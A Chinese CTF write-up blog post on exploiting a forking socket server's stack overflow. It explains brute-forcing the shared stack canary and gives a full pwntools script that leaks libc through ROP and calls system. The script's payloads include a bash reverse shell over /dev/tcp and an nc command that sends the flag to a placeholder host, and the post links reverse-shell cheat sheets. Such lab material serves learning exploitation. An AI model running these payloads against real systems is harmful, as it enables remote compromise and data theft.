---
layout: post
title: "cookie爆破"
date: 2018-05-23
categories: jekyll update
---
### level6_cookie


这是一个简单的**socket服务器栈溢出**的题目
##### 溢出漏洞点
<img src="/images/posts/keen/1530851457324.png" >
**特点：fork子程序，从同一片内存申请，cookie值一样，可以爆破**

**这里本地调试需要先创建一个具有root权限的level6，然后用该用户来执行该程序，注意这里需要先起一个服务器，然后再nc连上去进行调试**

##### 一些小知识点和疑问
```
TCP反连；nc反弹shell：cat flag | nc xxx.xxx.xx.xx 8888
关于反弹shell的一些资料参考：
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://www.gnucitizen.org/blog/reverse-shell-with-bash/
疑问：为什么cookie会距离ebp有12byte这么远？
尝试解答：是不是这个ebp是主函数main的，而不是子函数的。所以中间还隔了一个子函数的ebp
SIGCHLD
进程Terminate或Stop的时候，SIGCHLD会发送给它的父进程。缺省情况下该Signal会被忽略
```

##### 调试用到的命令：
```
print system #看泄露出来的地址是否与链接库的地址相同
info proc   #查看进程号
cat /home/level6/9441/fd  #查看fd可能的值(标准输入/出和默认值)
ROPgadget --binary cookie #查找ROP
ps -aux | grep cookie #查看当前运行进程
info proc all  #查看一些程序运行的信息
set follow-fork-mode child  #fork之后调试子进程，父进程不受影响。
上面一条命令参考链接：https://www.ibm.com/developerworks/cn/linux/l-cn-gdbmp/index.html
```
##### 做题过程中遇到的问题和解决办法
+  对C语言写的socket不熟悉，需要去了解其中的流程(但其实对解题没太大的影响)
+  主要是这里用到了fork子进程来进行执行输入的，所以每次输入都会从同一个内存片段去取cookie(只要这个进程没断就是从同一片内存中取值)
+  一段时间没做题，调试起来有点生疏，调试的时候注意考虑下断点的位置，然后逐步ni单步查看执行的整个流程是否符合我们设置的跳转
+  这次调试不出来主要是参数个数问题，c语言里面没有默认参数为0这个说法，需要查好调用每一个函数的参数个数和值进行一一配置。
+  不必要的send多次payload可以通过ROP连接起来，灵活利用，灵活操作。

##### 本题主要思路
+ 配置好本地调试的服务器环境(具有root权限的level6)
+ 爆破cookie
+ 确定溢出位置和溢出长度
+ 泄露send地址
+ 确定下断点位置：0x08048C47进行调试
+ 找到一个可写的地址，通过recv接收数据写到那个地址上，再把该地址作为参数给到system来调用即可getshell

##### 具体详细代码
```
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'

IP = '192.168.210.11'
#IP = '192.168.23.130'
PORT = 10006
NORMAL_RET_ADDR = 0x804897b
TEST_FINI = 0x8048fc0

canary = "\x00"
padding = "a"*64
"""
for x in xrange(3):
    for y in xrange(256):
        with remote(IP, PORT) as p:
            if y == 10:
                continue
            p.send(padding+canary+chr(y) + chr(10))
            try:
                info = p.recvuntil('GoodBye')
		p.close()
		break
            except Exception as e:
                print('exception %s' % e)
		p.close()
                continue
    print('got single byte %x' % y)
    canary += chr(y)
print "cookie bruteforce complete with cookie = " + hex(u32(canary))
"""
canary = p32(0xb28dff00)
#canary = p32(0xc6586e00)
p = remote(IP, PORT)
libc = ELF('libc.so.6')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('cookie')
send_plt = elf.plt['send']
send_got = elf.got['send']
vuln_addr = 0x0804897B
payload1 = 'a'*64 + canary +'a'*12 + p32(send_plt) + p32(0) + p32(4) + p32(send_got) + p32(4) + p32(0)
p.sendlineafter('Would you like some cookie?\n', payload1)
#0xb7587000
#p.recvline()
#p.recv()
recved = p.recv()
#print(recved)
print(len(recved))
send_addr = u32(recved)
p.info('send addr %x' % send_addr)

libc_base = send_addr - libc.symbols['send']
p.info('libc base %x' % libc_base)

system_addr = libc_base + libc.symbols['system']
system_cmd = 'ls'
p.info('system addr %x' % system_addr)
recv_plt = elf.plt['recv']
writable_addr = 0x804b07c

p = remote(IP, PORT)
pause()
payload2 = 'bash -i >& /dev/tcp/xxx.xxx.xx.xx/8888 0>&1'.ljust(64, '\x00') + canary + 'a' * 12 + p32(recv_plt) + p32(system_addr) + p32(4) + p32(writable_addr) + p32(100) + p32(0)
'''
payload2 = 'bash -i >& /dev/tcp/xxx.xxx.xx.xx/8888 0>&1'.ljust(64, '\x00') + canary + 'a' * 12 + p32(recv_plt) + p32(0x08048fb8) + p32(4) + p32(writable_addr) + p32(100) + p32(0) + p32(system_addr) + p32(0) + p32(writable_addr)
'''
p.sendlineafter('Would you like some cookie?', payload2)
p.send('cat flag | nc xxx.xxx.xx.xx 8888'.ljust(100, '\x00'))


payload3 = 'a' * 64 + canary + 'a' * 12 + p32(system_addr) + p32(0) + p32(writable_addr)
p.info('system %x' % system_addr)
p.close()
p = remote(IP, PORT)
p.sendlineafter('Would you like some cookie?', payload3)
#p.interactive()

```